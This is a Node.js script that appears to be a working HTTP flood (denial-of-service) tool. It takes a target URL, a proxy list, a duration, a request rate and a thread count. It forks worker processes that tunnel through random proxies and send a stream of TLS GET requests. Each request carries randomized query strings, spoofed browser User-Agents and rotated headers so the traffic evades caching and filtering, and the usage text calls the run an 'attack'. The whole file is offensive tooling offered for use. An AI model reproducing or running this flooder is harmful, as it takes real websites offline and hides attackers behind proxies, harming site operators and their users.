process.on('uncaughtException', function (err) {
    console.error(err)
});
process.on('unhandledRejection', function (err) {
    console.error(err)
});
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const url = require('url');
const osList = [
    "iOS",
    "Windows",
    "X11",
    "Android",
];
const ios = [
    "iPhone; CPU iPhone OS 13_3 like Mac OS X",
    "iPad; CPU OS 13_3 like Mac OS X",
    "iPod touch; iPhone OS 4.3.3",
    "iPod touch; CPU iPhone OS 12_0 like Mac OS X",
];

const android = [
    "Linux; Android 4.2.1; Nexus 5 Build/JOP40D",
    "Linux; Android 4.3; MediaPad 7 Youth 2 Build/HuaweiMediaPad",
    "Linux; Android 4.4.2; SAMSUNG GT-I9195 Build/KOT49H",
    "Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T",
    "Linux; Android 5.1.1; vivo X7 Build/LMY47V",
    "Linux; Android 6.0; Nexus 5 Build/MRA58N",
    "Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2",
    "Linux; Android 8.0.0; SM-N9500 Build/R16NW",
    "Linux; Android 9.0; SAMSUNG SM-G950U",
];

const windows = [
    "Windows NT 10.0; Win64; X64",
    "Windows NT 10.0; WOW64",
    "Windows NT 5.1; rv:7.0.1",
    "Windows NT 6.1; WOW64; rv:54.0",
    "Windows NT 6.3; Win64; x64",
    "Windows NT 6.3; WOW64; rv:13.37",
];

const x11 = [
    "X11; Linux x86_64",
    "X11; Ubuntu; Linux i686",
    "SMART-TV; Linux; Tizen 2.4.0",
    "X11; Ubuntu; Linux x86_64",
    "X11; U; Linux amd64",
    "X11; GNU/LINUX",
    "X11; CrOS x86_64 11337.33.7",
    "X11; Debian; Linux x86_64",
];

const accepts = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate",
    "Accept-Encoding: gzip, deflate",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1"
]
const characters       = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
var http = require('http');
var tls = require('tls');
var path = require('path');
const cluster = require('cluster');
var fileName = __filename;
var file = path.basename(fileName);
if (process.argv.length < 7) {
    console.log('node ' + file + ' URL:Ex: https://google.com PROXIES:Ex: http.txt TIME:Ex:60 (A.K.A 60 seconds) RATE:Ex: 100 (A.K.A 100 requests per connection) THREADS:Ex: 10 (A.K.A Use 10 threads for the attack).');
    process.exit(0);
}
if (cluster.isMaster) {
    for (let i = 1; i <= process.argv[6]; i++) {
        cluster.fork();
        console.log(`Started ${i} threads.`);
    }
    console.log('Attack started!')
    setTimeout(() => {
        process.exit(1);
    }, process.argv[4] * 1000);
} else {
    start();
}
var proxies = fs.readFileSync(process.argv[3], 'utf-8').toString().replace(/\r/g, '').split('\n');
const splitedUrl = process.argv[2].split('""')[0];
var parsedUrl = url.parse(splitedUrl);
process.setMaxListeners(0);
const cipherList = [
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH'
];
function getUserAgent() {
    var osName = osList[Math.floor(Math.random() * osList.length)]
    var version
    if (osName == "iOS") {
        version = ios[Math.floor(Math.random() * ios.length)]
    }
    if (osName == "Android") {
        version = android[Math.floor(Math.random() * android.length)]
    }
    if (osName == "Windows") {
        version = windows[Math.floor(Math.random() * windows.length)]
    }
    if (osName == "X11") {
        version = x11[Math.floor(Math.random() * x11.length)]
    }
    return "Mozilla/5.0 " + "(" + version + ")" + " AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + Math.floor(Math.random() * (90 - 60) + 60).toString() + ".0." + Math.floor(Math.random() * (5000 - 4000) + 4000).toString() + "." + Math.floor(Math.random() * (60 - 40) + 40).toString() + " Safari/537.36"
}
function start() {
    setInterval(() => {
        var proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
        var tunnel = http.request({
            host: proxy[0],
            port: proxy[1],
            method: 'CONNECT',
            path: parsedUrl.host + ':443'
        }, (err) => {
            tunnel.end();
            return;
        });
        tunnel.on('connect', function (_, socket, _) {
            var conn = tls.connect({
                host: parsedUrl.host,
                //cipher: 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                ciphers: cipherList[Math.floor(Math.random() * cipherList.length)],
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.2',
                servername: parsedUrl.host,
                secure: true,
                rejectUnauthorized: false,
                socket: socket
            }, function () {
                for (let i = 0; i < process.argv[5]; i++) {
                    conn.write('GET ' + parsedUrl.path + '?' + characters.charAt(Math.floor(Math.random() * 
                    characters.length)) + Math.floor(Math.random() * (1000000 - 100000) + 100000).toString() + characters.charAt(Math.floor(Math.random() * 
                    characters.length)) + Math.floor(Math.random() * (1000000 - 100000) + 100000).toString() + ' HTTP/1.1\r\nHost: ' + parsedUrl.host + '\r\nConnection: Keep-Alive\r\n' + accepts[Math.floor(Math.random() * accepts.length)] + '\r\nUser-Agent: ' + getUserAgent() + '\r\n\r\n');
                }
            });
            conn.on('error', function (data) {
                conn.end();
                conn.destroy();
            });
        });
        tunnel.end();
    });
}